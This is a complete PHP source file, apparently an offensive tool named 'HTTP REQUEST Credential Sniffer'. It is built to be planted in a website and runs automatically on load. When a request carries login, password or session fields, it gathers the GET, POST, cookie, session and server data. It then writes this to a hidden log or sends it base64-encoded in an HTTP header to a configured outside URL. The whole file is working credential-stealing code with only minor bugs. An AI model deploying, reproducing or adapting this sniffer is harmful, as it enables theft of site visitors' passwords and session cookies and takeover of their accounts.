<?php

/*
    PHP HTTP REQUEST Credential Sniffer

    hcs.php - Main Program

    Copyright (C) 2012 - 2014 Jan Seidl

    The MIT License (MIT)

    Permission is hereby granted, free of charge, to any person obtaining a copy of
    this software and associated documentation files (the "Software"), to deal in
    the Software without restriction, including without limitation the rights to
    use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
    the Software, and to permit persons to whom the Software is furnished to do so,
    subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
    FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
    COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
    IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
    CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

 */

/* Constants */

define('HCS_EXF_FILE', 0);
define('HCS_EXF_HTTP_HEAD', 1);

if (stristr(PHP_OS, 'WIN')) {
    define('DS', '\\');
} else {
    define('DS', '/');
}//end :: if

/* Configuration */

# define('HCS_EXF_FILE_FILENAME', 'hcs.log');
define('HCS_EXF_HTTP_HEAD_URL', 'http://localhost/header_dumper.php');
define('HCS_EXF_HTTP_HEAD_HEADER', 'X-HCS-Payload');
define('HCS_EXFILTRATION_MODE', HCS_EXF_HTTP_HEAD);

/* Functions */

function hcs_init() {

    # Keywords that will trigger the capture (regex)
    $trigger_keywords = '(p(?:ass|)(?:(word|wd|w|))|user(?:name|)|sess(?:ion|)|login)';

    $request_keys = array_keys($_REQUEST);
    $request_keys_str = implode(" ", $request_keys);

    $matches = Array();
    $match_status = 0;

    $match_status = preg_match('/'.$trigger_keywords.'/i', $request_keys_str, $matches);

    if ($match_status === 1) hcs_exfiltrate_session();

}//end :: hcs_init

function hcs_exfiltrate_session() {

    $session_data = Array(
        'GET'       => (array) $_GET,
        'SERVER'    => (array) $_SERVER
        );

    if (isset($_ENV)) $session_data['ENV'] = $_SESSION;
    if (isset($_SESSION)) $session_data['SESSION'] = $_SESSION;
    if (isset($_POST)) $session_data['POST'] = $_POST;
    if (isset($_COOKIE)) $session_data['COOKIE'] = $_COOKIES;

    switch (HCS_EXFILTRATION_MODE) {
        case HCS_EXF_HTTP_HEAD:
            hcs_exf_http_head($session_data);
            break;
        case HCS_EXF_FILE:
        default:
            hcs_exf_file($session_data);
            break;
    }//end :: switch

}//end :: hcs_exfiltrate_session

function hcs_exf_file($session_data) {
    if (!defined('HCS_EXF_FILE_FILENAME')) return false;

    $filepath = realpath(dirname(__FILE__));

    $line = "#### HCS LOG START ## ".date("d/m/Y H:i:s")." ####\n";
    $line .= print_r($session_data, true);
    $line .= "### HCS LOG END ###\n";

    return file_put_contents($filepath.DS.HCS_EXF_FILE_FILENAME, $line, FILE_APPEND | LOCK_EX);
    
}//end :: hcs_exf_file

function hcs_exf_http_head($session_data) {

    if (!defined('HCS_EXF_HTTP_HEAD_URL')) return false;

    $ch = curl_init();
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt ($ch, CURLOPT_URL, HCS_EXF_HTTP_HEAD_URL);
    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 20);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, 1); 
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1); 
    curl_setopt ($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

    // Only calling the head
    curl_setopt($ch, CURLOPT_HEADER, true); // header will be at output
    curl_setopt($ch, CURLOPT_NOBODY, true); // HTTP request is 'HEAD'

    // Set our payload
    $encoded_data = base64_encode(serialize($session_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, Array(HCS_EXF_HTTP_HEAD_HEADER.": $encoded_data")); 

    curl_exec ($ch); // dont mind return
    curl_close ($ch);

    return true;

}//end :: if

hcs_init();

?>
